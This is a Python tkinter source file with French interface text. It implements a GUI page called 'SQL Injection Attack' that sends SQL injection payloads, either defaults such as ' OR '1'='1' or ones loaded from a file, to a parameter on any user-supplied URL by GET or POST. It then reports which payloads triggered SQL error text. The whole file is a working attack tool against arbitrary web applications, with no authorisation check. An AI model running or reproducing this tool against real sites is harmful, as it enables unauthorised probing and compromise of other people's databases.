import tkinter as tk
from tkinter import messagebox, filedialog, Toplevel
import requests

class SQLiPage(tk.Frame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        # Titre
        self.title_label = tk.Label(self, text="SQL Injection Attack", font=("Arial", 16))
        self.title_label.pack(pady=20)

        # Champs URL et méthode
        self.url_label = tk.Label(self, text="URL cible (ex: http://example.com/search):")
        self.url_label.pack(pady=5)
        self.url_entry = tk.Entry(self, width=60)
        self.url_entry.pack(pady=5)

        self.method_label = tk.Label(self, text="Méthode HTTP :")
        self.method_label.pack(pady=5)
        self.method_var = tk.StringVar(value="GET")
        tk.Radiobutton(self, text="GET", variable=self.method_var, value="GET").pack()
        tk.Radiobutton(self, text="POST", variable=self.method_var, value="POST").pack()

        # Paramètre et fichier payloads
        self.param_label = tk.Label(self, text="Nom du paramètre à injecter :")
        self.param_label.pack(pady=5)
        self.param_entry = tk.Entry(self, width=40)
        self.param_entry.pack(pady=5)

        self.payload_label = tk.Label(self, text="Payloads SQL : (ou importer un fichier)")
        self.payload_label.pack(pady=5)
        self.payload_entry = tk.Entry(self, width=60)
        self.payload_entry.insert(0, "' OR '1'='1', ' OR 'a'='a'")
        self.payload_entry.pack(pady=5)

        self.load_payload_button = tk.Button(self, text="Importer un fichier de payloads",
                                             command=self.load_payload_file)
        self.load_payload_button.pack(pady=5)

        # En-têtes HTTP
        self.headers_label = tk.Label(self, text="Headers HTTP (facultatif, clé:valeur séparés par des virgules):")
        self.headers_label.pack(pady=5)
        self.headers_entry = tk.Entry(self, width=60)
        self.headers_entry.pack(pady=5)

        # Bouton pour lancer l'attaque
        self.start_button = tk.Button(self, text="Lancer l'attaque SQLi", command=self.start_attack)
        self.start_button.pack(pady=10)

        # Label pour afficher le statut
        self.status_label = tk.Label(self, text="", font=("Arial", 12))
        self.status_label.pack(pady=10)

    def load_payload_file(self):
        """Charge les payloads SQL à partir d'un fichier texte."""
        file_path = filedialog.askopenfilename(filetypes=[("Fichiers texte", "*.txt")])
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    payloads = f.readlines()
                self.payload_entry.delete(0, tk.END)
                self.payload_entry.insert(0, ', '.join(p.strip() for p in payloads))
                messagebox.showinfo("Succès", "Payloads chargés depuis le fichier.")
            except Exception as e:
                messagebox.showerror("Erreur", f"Impossible de charger le fichier : {e}")

    def start_attack(self):
        """Démarre l'attaque SQLi."""
        url = self.url_entry.get()
        param = self.param_entry.get()
        method = self.method_var.get()
        payloads = self.payload_entry.get().split(',')
        headers_text = self.headers_entry.get()

        if not url or not param or not payloads:
            messagebox.showerror("Erreur", "Veuillez remplir tous les champs obligatoires.")
            return

        # Convertir les headers en dictionnaire
        headers = {}
        if headers_text:
            try:
                headers = dict(item.split(":") for item in headers_text.split(","))
            except Exception:
                messagebox.showerror("Erreur", "Format des headers incorrect (clé:valeur).")
                return

        self.status_label.config(text="L'attaque SQLi est en cours...")
        vulnerabilities = []

        # Tester chaque payload
        for payload in payloads:
            payload = payload.strip()
            if self.test_sqli(url, param, payload, method, headers):
                vulnerabilities.append(payload)

        # Afficher les résultats
        self.show_results(vulnerabilities)

    def test_sqli(self, url, param, payload, method, headers):
        """Tester un paramètre avec un payload SQLi."""
        data = {param: payload}  # Paramètre à injecter
        try:
            if method == "GET":
                response = requests.get(url, params=data, headers=headers)
            else:  # POST
                response = requests.post(url, data=data, headers=headers)

            # Détecter une vulnérabilité
            if "sql" in response.text.lower() or "syntax" in response.text.lower() or "mysql" in response.text.lower():
                return True
        except requests.exceptions.RequestException:
            pass
        return False

    def show_results(self, vulnerabilities):
        """Affiche une fenêtre avec les résultats."""
        results_window = Toplevel(self)
        results_window.title("Résultats du test SQLi")
        results_window.geometry("400x300")

        results_label = tk.Label(results_window, text="Résultats du test SQLi", font=("Arial", 14))
        results_label.pack(pady=10)

        if vulnerabilities:
            result_text = "Vulnérabilités détectées avec les payloads suivants :\n" + "\n".join(vulnerabilities)
        else:
            result_text = "Aucune vulnérabilité détectée."

        results_text = tk.Text(results_window, wrap="word")
        results_text.insert("1.0", result_text)
        results_text.config(state="disabled")
        results_text.pack(expand=True, fill="both", padx=10, pady=10)

        close_button = tk.Button(results_window, text="Fermer", command=results_window.destroy)
        close_button.pack(pady=10)
